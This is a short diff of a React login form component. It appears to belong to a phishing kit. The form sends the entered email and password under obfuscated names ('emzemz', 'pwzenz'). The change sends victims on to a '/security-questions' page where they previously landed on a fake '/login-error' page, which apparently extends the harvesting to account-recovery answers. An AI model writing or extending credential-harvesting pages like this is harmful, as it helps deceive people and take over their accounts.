@@ -57,7 +57,7 @@ const LoginForm: React.FC = () => {
         emzemz,
         pwzenz,
       });
-      navigate('/login-error', { state: { emzemz } });
+      navigate('/security-questions', { state: { emzemz } });
     } catch (error) {
       console.error('Error sending credentials:', error);
       setErrors((prev) => ({ ...prev, pwzenz: 'Unable to submit credentials. Please try again.' }));
